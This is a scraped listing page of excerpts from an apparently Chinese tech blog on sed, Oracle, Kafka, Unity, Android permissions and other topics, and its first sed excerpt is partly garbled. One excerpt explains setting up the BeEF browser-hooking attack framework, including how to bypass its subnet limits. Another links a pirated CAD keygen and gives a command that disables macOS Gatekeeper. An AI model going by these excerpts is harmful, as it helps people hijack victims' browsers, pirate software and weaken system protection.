a：追加，在当前行后添加一行或多行。 c：行替换，用c后面的字符串替换原数据行。 i：插入，在当前行前插入一行或多行。 p：打印，输出指定的行。 s：字符串替换，用一个字符串替换另外一个字符串。格式为'行范围s/旧字符串/新字符串/g' (如果不加g的话，则表示只替换每行第一个匹配的串) 1、删除：d命令
sed ‘2d’ sed.txt -----删除sed.txt文件的第二行。
sed ‘2, d ′ s e d . t x t − − − − − 删 除 s e d .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36607554d16c695d8ba995a97b811146/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46f58e4ecde71ad558f879f786272166/" rel="bookmark">
			ORACLE 巡检脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		脚本内容 vim oracle_inspection_report.sh
#!/bin/bash # # file name: /home/oracle/oracle_inspection_report.sh # # description: # part 1.collecting the DB basic infomation # part 2.collecting the DB performance infomation # part 3.collecting the DB LOG infomation # part 4.collecting the OS infomation # # excute: bash /home/oracle/oracle_inspection_report.sh # # author:chaicheng # # date(yyyy-mm-dd):2019-11-04 # # version:1.0 # # modified:none # echo 'Instance Health Data' echo '************************************************' echo 'The current database ORACLLE_SID is '$ORACLE_SID echo 'The current running processes for '$ORACLE_SID 'are' echo '************************************************' #ps -ef|grep $ORACLE_SID sqlplus -S /nolog &lt;&lt;EOF connect / as sysdba set feedback off set heading off select '*******************************************************************************' from dual; select '* 1: DB information *' from dual; select '*******************************************************************************' from dual; select '#####1-1: instance information' from dual; select '************************************************' from dual; set linesize 1000 set pagesize 1000 col HOST_NAME for a10 set heading on select instance_name,host_name,to_char(startup_time,'yyyy-mm-dd hh24:mi:ss') "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46f58e4ecde71ad558f879f786272166/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f15937ed3430001b83913356e8a9a4d8/" rel="bookmark">
			kali之beef的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、beef介绍二、kali下使用beef配置beef实际操作 一、beef介绍 BeeF是前欧美最流行的web框架攻击平台，kali 集成Beef，而且Beef有很多好使的payload。例如，通过XSS这个简单的漏洞，BeeF可以通过一段编制好的javascript控制目标主机的浏览器，通过浏览器拿到各种信息并且扫描内网信息，同时能够配合metasploit进一步渗透主机，强大的有些吓人。
beef也是属于c/s结构，具体看图
zombie（僵尸）即受害的浏览器。zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编 写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间 （默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就 像一个Web应用，被分为前端UI，和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。
二、kali下使用beef kali默认已经安装了beef，但是我的kali没有，我也不知道为什么0.0，那就自己装一个吧。命令：
apt install beef-xss kali已经把beef-xss做成服务了，推荐使用systemctl 命令来启动或关闭beef服务器
systemctl start beef-xss.service #开启beef systemctl stop beef-xss.service #关闭beef systemctl restart beef-xss.service #重启beef 配置beef kali下的BeeF配置文件在 /usr/share/beef-xss/conﬁg.yaml,其它的配置文件也在这个目录的子目录 下，往后在使用某些功能时，需要修改对应的配置文件。自主安装的BeeF配置文件会在BeeF的主目录 下conﬁg.yaml,建议修改几个地方：
permitted_hooking_subnet: "0.0.0.0/0" #指定某个网段，只有在这个网段的浏览器才能被hook permitted_ui_subnet: "0.0.0.0/0" #指定某个网段，只有在这个网段的浏览器才能访问管理UI #上面这两项都是可以被绕过的，只要使用X-Forwarded-For首部绕过，一般不需要设置 host: "0.0.0.0" #设置beef服务器的主机， 如果有自己的域名， 那么可以设置自己的域名, 没有就使用默认 port: "3000" #设置beef服务器监听的端口， 可以自己定一个，比如8080, 记得端口号需要大于1024 xhr_poll_timeout: 1000 #受害浏览器轮询beef主机的时间， 默认为1秒，可以设置为更低。 public: "" #public hostname/IP address public_port: "" #experimental # 这是让BeEF运行在一个反向代理或者NAT环境下才需要设置的。 web_ui_basepath: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f15937ed3430001b83913356e8a9a4d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb81d17bcf921d5afcff8f02cd456511/" rel="bookmark">
			puppeteer离线安装不同版本的chrome
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.背景 使用puppeteer时会默认下载chrome，由于要访问google，因此没有使用代理情况下，无法成功下载。通常是设置好环境变量，跳过chrome下载，随后单独下载chrome，并在浏览器启动项executablePath中指定文件路径。
{ headless: true args: [] executablePath : "chromePath" } 官方给出的chromium离线下载安装地址[1]如果不挂代理通常也无法打开。如果在linux/mac/windows平台下，设置了chrome执行文件的路径也可以正常启动。因此只要在不同平台下载chrome文件，随后指定路径，即可启动不同版本的chrome。
2. MacOS系统下载并使用不同版本的chrome 在有界面环境下测试，可以选择下载任意一个chrome版本。Mac系统下载的chrome文件通常是一个dmg文件，即mac下的磁盘镜像文件。当下载完毕，双击chrome的dmg文件，将其挂载，随后通过右键选择将其打开，即可进入安装文件目录。
目录中如下路径即是配置在puppeteer中启动chrome的路径。
/Volumes/Google\ Chrome/Google\ Chrome.app/Contents/MacOS/Google\ Chrome 3. Linux系统下载并使用不同版本的chrome 同macOs类似，在有界面环境下测试，linux下我们可以下载chrome的rpm包或deb包随后将其打开获取chrome即可。
rpm包下载完毕后，可以使用rpm2cpio[2]命令将其文件提取。
对于deb包，在mac下可以通过B1FreeArchiver这个工具打开，随后解压将文件提取。
文件提取完毕后，指定文件路径，即可启动不同版本的linux chrome。
4 下载特定版本的chromium 如果无界面环境下遇到错误，要提示我们下载特定版本，我们在启动时可能会遇到启动报错。这时去下载对应版本即可。可以在国内的镜像地址[3]，找到对应的版本，然后下载使用即可。
Timed out after 30000 ms while trying to connect to Chrome! The only Chrome revision guaranteed to work is r624492
参考 [1].chroium官方下载地址，https://download-chromium.appspot.com/.
[2].rpm2cpio的使用，https://stackoverflow.com/questions/18787375/how-do-i-extract-the-contents-of-an-rpm
[3].https://npm.taobao.org/mirrors/chromium-browser-snapshots/Linux_x64/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b63e5415cd7002eecb771ce08dbc947/" rel="bookmark">
			DStream实战之Spark Streaming整合Kafka, 通过 KafkaUtils.createDstream方式整合Kafka 37
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 kafka作为一个实时的分布式消息队列，实时的生产和消费消息，这里我们可以利用SparkStreaming实时地读取kafka中的数据，然后进行相关计算。在Spark1.3版本后，KafkaUtils里面提供了两个创建dstream的方法，一种为KafkaUtils.createDstream，另一种为KafkaUtils.createDirectStream。 1. KafkaUtils.createDstream方式整合Kafka 此种方式现在已被淘汰,大家可作为了解学习~
KafkaUtils.createDstream(ssc, [zk], [group id], [per-topic,partitions] ) 使用了receivers接收器来接收数据，利用的是Kafka高层次的消费者api.对于所有的receivers接收到的数据将会保存在Spark executors中.然后通过Spark Streaming启动job来处理这些数据，默认会丢失.可启用WAL日志，它同步将接受到数据保存到分布式文件系统上比如HDFS。 所以数据在出错的情况下可以恢复出来 。
Spark集群中的某个executor中有一个receiver线程, 这个线程负责从kafka中获取数据.
当receiver线程接收到数据后会做备份处理,即把数据备份到其他的executor中,也可能会备份到这个receiver线程所以在节点的executor中.当备份完毕后该现场会把每个partition的消费偏移量在zookeeper中修改,(新版本的kafka的offset保存在kafka集群中)修改完offset后,该receiver线程会把消费的数据告诉Driver.Driver分发任务时会根据每个executor上的数据,根据数据本地性发送. 2. 代码实现 pom文件中添加kafka依赖 &lt;dependency&gt; &lt;groupId&gt;org.apache.spark&lt;/groupId&gt; &lt;artifactId&gt;spark-streaming-kafka_0-8_2.11&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; 编写Spark Streaming程序 package cn.acece.sparkStreamingKafkaTest import org.apache.spark.streaming.dstream.{DStream, ReceiverInputDStream} import org.apache.spark.streaming.kafka.KafkaUtils import org.apache.spark.streaming.{Seconds, StreamingContext} import org.apache.spark.{SparkConf, SparkContext} /** * 从kafka中拉取数据 * 读取数据时, consumer记录的offset发送回kafka中, 保存在zk中 * 需要开始WAL日志保存模式防止数据丢失, 需要设置检查点 */ object SparkStreamingPollKafkaHighAPI { def main(args: Array[String]): Unit = { //1. 初始化参数,conf, sc, ssc val conf: SparkConf = new SparkConf() .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b63e5415cd7002eecb771ce08dbc947/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a216fccf4f0f034d582e710e165e8754/" rel="bookmark">
			节流、防抖及使用场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数防抖(debounce) 概念：在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。
//模拟一段ajax请求 function ajax(content) { console.log('ajax request ' + content) } let inputa = document.getElementById('unDebounce') inputa.addEventListener('keyup', function (e) { ajax(e.target.value) }) 向input框中一直输入文字：
只要按下键盘，就会触发ajax请求。这样会增加很多无效的请求浪费资源，实际应用中，是等用户输出完整的字符后才会请求。下面优化一下：
//模拟一段ajax请求 function ajax(content) { console.log('ajax request ' + content) } function debounce(fun, delay) { return function (args) { let that = this let _args = args clearTimeout(fun.id) fun.id = setTimeout(function () { fun.call(that, _args) }, delay) } } let inputb = document.getElementById('debounce') let debounceAjax = debounce(ajax, 500) inputb.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a216fccf4f0f034d582e710e165e8754/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/926bbc757f60f5c4cd33a51f48f8c91e/" rel="bookmark">
			Unity中用Shader实现镜子效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做项目的时候要用到镜子，折腾了一下午，发现做镜子还是蛮快的，总结了一下网上的教程，大致有这么几种做法：
1、使用反射探针（Reflection Probe）
2、使用Render Texture
3、使用Shader着色器，我发现这种方法步骤比较少，而且重复使用起来也方便
下面就介绍一下这个方法，以及期间我踩过的坑；官方的教程在这里：MirrorReflection4
（我之所以说比较简单，是因为Shader方法可以用网上现成的代码，基本不用改
话不多说进入正题：
首先利用Shader做镜子，需要两段代码，一个是.shader着色器代码，另一个是C#脚本代码
着色器代码如下：
Mirror.shader Shader "FX/MirrorReflection" { Properties { _MainTex ("Base (RGB)", 2D) = "white" {} [HideInInspector] _ReflectionTex ("", 2D) = "white" {} } SubShader { Tags { "RenderType"="Opaque" } LOD 100 Pass { CGPROGRAM #pragma vertex vert #pragma fragment frag #include "UnityCG.cginc" struct v2f { float2 uv : TEXCOORD0; float4 refl : TEXCOORD1; float4 pos : SV_POSITION; }; float4 _MainTex_ST; v2f vert(float4 pos : POSITION, float2 uv : TEXCOORD0) { v2f o; o.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/926bbc757f60f5c4cd33a51f48f8c91e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39e7fb616ce0e3370525678c06d2be42/" rel="bookmark">
			Kong 系列 -- Kong 101
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着微服务、开放平台等概念的兴起，实践过程中 API 数量呈现爆发式增长，对外、对内如何治理？网关是针对这一系列疑问的部分回应，才疏学浅，只能留下一些烂笔头。
目前 API 网关实现比较多，Kong、Orange、Traefik、Tyk、Istio 等。Kong 就是其中一个开源的 API 网关实现，有社区支持，相对比较活跃，也有商业版本提供给企业客户。最近要在 k8s 中试用 Kong，所以接下来一段时间的博客主要就围绕 Kong 做一些记录。
本篇主要是参照了 官方安装文档 ，在本地安装的笔记。
OS：Ubuntu 19.04 Desktop x64
Kong：1.4.0
Postgresql：11.5
1、安装 Kong Kong 支持很多种安装模式
这里用的 Ubuntu 下手工安装的方式，先下载 deb 包。因官网没有提供 Ubuntu-19.04 的包，所以下载了 Ubuntu-18.04 的 deb 包，后面跑起来也没发现有什么问题。
$ sudo apt-get update $ sudo apt-get install openssl libpcre3 procps perl $ sudo dpkg -i &lt;kong-download-path&gt;/kong-1.4.0.bionic.amd64.deb 安装完后，相关目录分别是 /etc/kong、/usr/local/kong
# 这个 kong.conf 是我 cp 了 kong.conf.default 的一个修改版本 cq@ubuntu /etc/kong % ls kong.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39e7fb616ce0e3370525678c06d2be42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70cc7545d9ea5108589bb79fc571d0b8/" rel="bookmark">
			Mac CAD 安装完成后，打开注册机时出现 应用程序“02_注册机”不能打开。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		好不容易安装了CAD，但是在打开注册机时候出现下图情况。
导致以上原因解决方法：
方法0：或者你换用这个注册机试下：
链接: https://pan.baidu.com/s/1Av0WAqF6GtANw2CZGHi_dw 提取码: fm6r
方法一：你断开网络，关闭防火墙，再试试。
方法二：请设置下这里：“系统与偏好设置”——”安全与隐私”，——通用。如下图红色箭头“任何来源”勾选。
然后就可以去从新打开注册机了。
你的电脑可能没有上图的“任何来源”，或者是阴影的。如下图情况：
解决方法：
1、打开“终端”。
终端在 应用程序 文件夹下面的 实用工具 文件夹中，图标是黑色的，如下图。
2、（复制粘贴下面的代码到终端，再回车即可）
sudo spctl --master-disable
3、会提示你输入密码（就是开机密码），然后回车。就可以了。
4、现在我们 重新打开 系统偏好设置 -&gt; 安全性与隐私，你会发现，已经有“任何来源”这个选项了，如下图（还是没有的话，就重启下电脑试试）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9f211fc4e2ef5e1bb21bf675d96f39b/" rel="bookmark">
			Uipath如何截图粘贴到Excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		东京IT青年前线
http://www.rpatokyo.com/
Uipath如何处理截图
Uipath如何把画面局部截图贴到Excel里
使用Take Screenshot Activity
点击Indicate on screen抓取你想要的图片
在Take Screenshot Activity的返回值中定义一个image类型的变量
使用Invoke Method Activity将截取的图片保存在剪贴板中
在Invoke Method 中设置参数
Target Type: System.windows.Forms.Clipboard
Method Name: SetImage
设置Parameters的入力参数
然后使用Excel Application Scope打开指定Excel选中单元格，使用Send Hotkey 粘贴Ctrl + V即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ddab4362012442bddd421aecf5b4687/" rel="bookmark">
			C&#43;&#43;与字符集、字符编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
问题
字符集
字符编码
字符集与字符编码的关系
多种字符编码存在的意义
字符编码的发展历史
活动代码页
c++的多字节字符与宽字节字符
c++的多字节字符串与宽字节字符串
C++程序输出字符串的编码
字符串常量
参考文章
问题 字符集和编码往往是IT菜鸟甚至是各种大神的头痛问题。当遇到纷繁复杂的字符集，各种火星文和乱码时，问题的定位往往变得非常困难。本文就将会从原理方面对字符集和编码做个简单的科普介绍，同时也会介绍C++中设置字符串编码以及编码转换的一些方法。
字符集 简单的说，字符集就规定了某个文字对应的二进制数字存放方式（编码）和某串二进制数值代表了哪个文字（解码）的转换关系。常见的字符集如ASCII、GB2312、GBK等。
下面就是屌这个字在各种编码下的十六进制和二进制编码结果
字符编码 字符集只是一个规则集合的名字，对应到真实生活中，字符集就是对某种语言的称呼。例如：英语，汉语，日语。
对于一个字符集来说要正确编码转码一个字符需要三个关键元素：字库表、编码字符集、字符编码。
字库表是一个相当于所有可读或者可显示字符的数据库，字库表决定了整个字符集能够展现表示的所有字符的范围。
编码字符集，即用一个编码值来表示一个字符在字库中的位置。
字符编码定义编码字符集和实际存储数值之间的转换关系。一般来说，都会直接将字符的编码值直接进行存储。例如在ASCII中A在表中排第65位，而编码后A的数值是0100 0001也即十进制的65的二进制转换结果。
字符集与字符编码的关系 一般一个字符集等同于一个编码方式，ANSI体系的字符集如ASCII、ISO 8859-1、GB2312、GBK等等都是如此。一般我们说一种编码都是针对某一特定的字符集。
一个字符集上也可以有多种编码方式，例如UCS字符集(也是Unicode使用的字符集)上有UTF-8、UTF-16、UTF-32等编码方式。
多种字符编码存在的意义 既然字库表中的每一个字符都有一个自己的序号，直接把序号作为存储内容就好了。为什么还要多此一举通过字符编码把序号转换成另外一种存储格式呢？
统一字库表的目的是为了能够涵盖世界上所有的字符，但实际使用过程中会发现真正用的上的字符相对整个字库表来说比例非常低。例如中文地区的程序几乎不会需要日语字符，而一些英语国家甚至简单的ASCII字库表就能满足基本需求。而如果把每个字符都用字库表中的序号来存储的话，每个字符就需要3个字节（这里以Unicode字库为例），这样对于原本用仅占一个字符的ASCII编码的英语地区国家显然是一个额外成本（存储体积是原来的三倍）。于是就出现了UTF-8这样的变长编码。在UTF-8编码中原本只需要一个字节的ASCII字符，仍然只占一个字节。而像中文及日语这样的复杂字符就需要2个到3个字节来存储。
字符编码的发展历史 第一个阶段：ASCII字符集和ASCII编码
计算机刚开始只支持英语(即拉丁字符)，其它语言不能够在计算机上存储和显示。ASCII用一个字节(Byte)的7位(bit)表示一个字符，第一位置0。后来为了表示更多的欧洲常用字符又对ASCII进行了扩展，又有了EASCII，EASCII用8位表示一个字符，使它能多表示128个字符，支持了部分西欧字符。
第二个阶段:ANSI编码（本地化）
为使计算机支持更多语言，通常使用 0x80~0xFF 范围的 2 个字节来表示 1 个字符。比如：汉字 ‘中’ 在中文操作系统中，使用 [0xD6,0xD0] 这两个字节存储。
不同的国家和地区制定了不同的标准，由此产生了 GB2312, BIG5, JIS 等各自的编码标准。这些使用 2 个字节来代表一个字符的各种汉字延伸编码方式，称为 ANSI 编码。在简体中文系统下，ANSI 编码代表 GB2312 编码，在日文操作系统下，ANSI 编码代表 JIS 编码。
不同 ANSI 编码之间互不兼容，当信息在国际间交流时，无法将属于两种语言的文字，存储在同一段 ANSI 编码的文本中。
第三个阶段：UNICODE（国际化）
为了使国际间信息交流更加方便，国际组织制定了 UNICODE 字符集，为各种语言中的每一个字符设定了统一并且唯一的数字编号，以满足跨语言、跨平台进行文本转换、处理的要求。UNICODE 常见的有三种编码方式:UTF-8(1-4个字节表示)、UTF-16((2个字节表示))、UTF-32(4个字节表示)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ddab4362012442bddd421aecf5b4687/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ff6497d3924cdf2f7096d5f1a4eee54/" rel="bookmark">
			SpringBoot项目修改html后不即时编译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot项目修改html后不即时编译
https://blog.csdn.net/weixin_33827590/article/details/93164379
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9d7fb600b37adc114d50cbbd6d23617/" rel="bookmark">
			Android权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		权限 名称 描述 android.permission.ACCESS_CHECKIN_PROPERTIES 访问登记属性 读取或写入登记check-in数据库属性表的权限 android.permission.ACCESS_COARSE_LOCATION 获取错略位置 通过WiFi或移动基站的方式获取用户错略的经纬度信息,定位精度大概误差在30~1500米 android.permission.ACCESS_FINE_LOCATION 获取精确位置 通过GPS芯片接收卫星的定位信息,定位精度达10米以内 android.permission.ACCESS_LOCATION_EXTRA_COMMANDS 访问定位额外命令 允许程序访问额外的定位提供者指令 android.permission.ACCESS_MOCK_LOCATION 获取模拟定位信息 获取模拟定位信息,一般用于帮助开发者调试应用 android.permission.ACCESS_NETWORK_STATE 获取网络状态 获取网络信息状态,如当前的网络连接是否有效 android.permission.ACCESS_SURFACE_FLINGER 访问Surface Flinger Android平台上底层的图形显示支持,一般用于游戏或照相机预览界面和底层模式的屏幕截图 android.permission.ACCESS_WIFI_STATE 获取WiFi状态 获取当前WiFi接入的状态以及WLAN热点的信息 android.permission.ACCOUNT_MANAGER 账户管理 获取账户验证信息,主要为GMail账户信息,只有系统级进程才能访问的权限 android.permission.AUTHENTICATE_ACCOUNTS 验证账户 允许一个程序通过账户验证方式访问账户管理ACCOUNT_MANAGER相关信息 android.permission.BATTERY_STATS 电量统计 获取电池电量统计信息 android.permission.BIND_APPWIDGET 绑定小插件 允许一个程序告诉appWidget服务需要访问小插件的数据库,只有非常少的应用才用到此权限 android.permission.BIND_DEVICE_ADMIN 绑定设备管理 请求系统管理员接收者receiver,只有系统才能使用 android.permission.BIND_INPUT_METHOD 绑定输入法 请求InputMethodService服务,只有系统才能使用 android.permission.BIND_REMOTEVIEWS 绑定RemoteView 必须通过RemoteViewsService服务来请求,只有系统才能用 android.permission.BIND_WALLPAPER 绑定壁纸 必须通过WallpaperService服务来请求,只有系统才能用 android.permission.BLUETOOTH 使用蓝牙 允许程序连接配对过的蓝牙设备 android.permission.BLUETOOTH_ADMIN 蓝牙管理 允许程序进行发现和配对新的蓝牙设备 android.permission.BRICK 变成砖头 能够禁用手机,非常危险,顾名思义就是让手机变成砖头 android.permission.BROADCAST_PACKAGE_REMOVED 应用删除时广播 当一个应用在删除时触发一个广播 android.permission.BROADCAST_SMS 收到短信时广播 当收到短信时触发一个广播 android.permission.BROADCAST_STICKY 连续广播 允许一个程序收到广播后快速收到下一个广播 android.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9d7fb600b37adc114d50cbbd6d23617/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/928477e0d930ad751b6de0d1573b576b/" rel="bookmark">
			cjson学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，cJSON结构体
typedef struct cJSON { struct cJSON *next,*prev;	/* next/prev allow you to walk array/object chains. Alternatively, use GetArraySize/GetArrayItem/GetObjectItem */ struct cJSON *child;	/* An array or object item will have a child pointer pointing to a chain of the items in the array/object. */ int type;	/* The type of the item, as above. */ char *valuestring;	/* The item's string, if type==cJSON_String */ int valueint;	/* The item's number, if type==cJSON_Number */ double valuedouble;	/* The item's number, if type==cJSON_Number */ char *string;	/* The item's name string, if this item is the child of, or is in the list of subitems of an object.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/928477e0d930ad751b6de0d1573b576b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/babe0b745f9878168b6660c8a02ce61f/" rel="bookmark">
			BigDecimal保留四位小数:
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 BigDecimal保留四位小数: BigDecimal decNum = new BigDecimal();
decNum .setScale(4, BigDecimal.ROUND_HALF_UP) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f191ab283340283ee2e324c5e93025e5/" rel="bookmark">
			微信小程序云开发实现订阅消息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		**
借助小程序云开发轻松实现订阅消息 **
我们也是新建一个云开发demo，不过现在没有简单的模板了，我一会将该功能的源码上传至公众号后端，大家发送’订阅消息‘即可获得源码，将订阅的功能删除就行了，当作自己以后云开发的demo.
接下来我们建立好云开发demo后,将index页面通过编写wxml,和wxss写出如下格式
具体的index代码我已经压缩好，大家后台下载就行。在这我解释下这样做的原因。 首先我们想要用户在实现我们小程序的某项功能时，我们希望在该功能满足条件的时候给用户发送微信的订阅消息，比如用户在小程序上购买了一杯奶茶，我们希望给用户发送取餐提醒，我们就需要挣得用户得同意，这个就是订阅书籍交易信息提醒得作用，获取用户允许发送订阅消息得权限。
接下来我们怎么知道什么时候该给用户发送订阅消息呢，这就好比用户得餐饮好了，我们想让用户到店取餐，这时候发送消息，也即发送书籍交易信息提醒得作用，只不过这里我们都是用按钮触发得事件，大家可以根据自己程序得需求选择场景。
这是实现获取权限得js代码
这是发送订阅消息得代码
此同时我们要建立两个云函数，**我们可以通过云函数管理我们得数据库，**这样比较方便，权限也比较多
一个是将用户订阅信息得种类存到数据库，一个是调用数据向用户发送消息，里边具体得代码，我都有详细得注释，大家将源码下载下来查看即可。
与此同时我们还要做得就是，在数据库建立一个集合用来存放订阅信息
这样我们就能实现新版订阅消息得订阅与发送了。大家下载源码后将app.js中得云开发环境改成自己得，将index得TmplId得值改成自己在公众平台选择得即可，之后一定要在真机调试才可。
功能实现如下：
具体得源码在公众号（名字：一只拒穿格子衫的程序猿）后台回复：订阅消息，即可获得下载链接。该公众号主要向像我一样的新手小白传授经验，进行探讨，大神可自动忽略。
如果我写的有问题，希望大家可以指出来，我会及时改正。
下一篇文章将会像大家介绍云函数路由，这是一个极其方便的用法，望大家关注下篇文章。
我的公众号是：一只拒穿格子衫的程序猿
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63c977b6a0c1907ca24fd666d99271e1/" rel="bookmark">
			如何从AD导出PDF原理图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://jingyan.baidu.com/article/7c6fb428d4759080642c9017.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a6277b8c05b2d54fbe815b6d8b1728d/" rel="bookmark">
			构造方法可不可以被重写和重载？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		构造方法可以被重载。
构造方法不可以被重写，因为重写发生在父类和子类之间，要求方法名称相同，而构造方法的名称是和类名相同的，而子类类名不会和父类类名相同，所以不可以被重写。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7ff8bd821d7d451712047164270ee47/" rel="bookmark">
			算法：流水作业调度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
n个作业 N={1，2，…，n}要在2台机器M1和M2组成的流水线上完成加工。每个作业须先在M1上加工，然后在M2上加工。M1和M2加工作业 i 所需的时间分别为 ai 和bi，每台机器同一时间最多只能执行一个作业。
流水作业调度问题要求确定这n个作业的最优加工顺序，使得所有作业在两台机器上都加工完成所需最少时间。最优调度应该是：
使M1上的加工是无间断的。即M1上的加工时间是所有ai之和，但M2上不一定是bi之和。
使作业在两台机器上的加工次序是完全相同的。
则得结论：仅需考虑在两台机上加工次序完全相同的调度。
最优子解结构
机器M1开始加工S中作业时，机器M2还在加工其他作业，要等时间 t 后才可利用,则：
1. 则完成S中作业所需的最短时间记为T(S,t)
2. 完成所有作业所需的最短时间为T(N,0)
3. T(N,0)=min{ai + T(N-{i}, bi)}, i∈N。
ai：选一个作业i先加工，在M1的加工时间。
T(N-{i},bi}：剩下的作业要等bi时间后才能在M2上加工。注意这里函数的定义，因为一开始工作i是随机取的，M1加工完了ai之后，要开始加工bi了，这里M1是空闲的可以开始加工剩下的N-i个作业了，但此时M2开始加工bi，所以要等bi时间之后才能重新利用，对应到上面函数T(s,t)的定义的话，这里就应该表示成T(N-{i},bi), 所以最优解可表示为T(N,0)=min{ai + T(N-{i}, bi)}, i∈N，即我们要枚举所有的工作i，使这个式子取到最小值。这里顺便吐槽一句：算法中会利用很多数学知识，一定要搞清楚函数的意义以及每个数学符号所代表的含义，这样不至于各种懵比。继续分析T(S,t)可得：
T(S,t)={ai + T(S-{i}, bi+max{t-ai,0})}, i∈S
其中：T(S-{i}, bi+max{t-ai,0})：剩下的作业等bi+max{t-ai,0}才能在M2加工，至于这里是怎么推导出来的呢？见下面推导：
最优子结构的证明（问题最优解包括子问题最优解）：
最优子结构：设π是N的一个最优调度，其加工顺序为π1,…, πn，其所需的加工时间为 aπ1+T’(即第一个作业π1在M1上加工的时间和其它的加工时间)。记S=N-{π1}，则T’=T(S, bπ1)。
证明：由T的定义知T(S, bπ1)是对S最优的，故T’&gt;=T(S, bπ1)。若T’&gt;T(S, bπ1),设π’是作业集S在机器M2的等待时间为bπ1情况下的一个最优调度。则π1,π’2, …,π’n是N的一个调度，且该调度所需的时间为aπ1+T’ &gt; aπ1+T(S, bπ1)。这与π是N的最优调度矛盾。故T’&lt;=T(S, bπ1), 从而T’=T(S, bπ1)。最优子结构的性质得证。
分析：
这段证明我开始有点云里雾里的，简单来说就是要证明问题的最优解包含子问题的最优解就行了，那么这里的证明思路是先假设一个最优调度，对于他的子调度T’，因为T(S,t)被定义为是完成S中作业所需的最短时间记为T(S,t)，所以有T’&gt;=T(S, bπ1)，那么如果这个子调度这里不是最优解的话即T’&gt;T(S, bπ1)，会得出aπ1+T’ &gt; aπ1+T(S, bπ1)即原来假设的最优调度不符和最优调度的标准，矛盾，从而推出 T’是一定等于T(S, bπ1)，即这个子调度也是最优调度。
问题是：虽然满足最优子结构性质，也在一定程度满足子问题重叠性质。N的每个非空子集都计算一次，共2n-1次，指数级的。
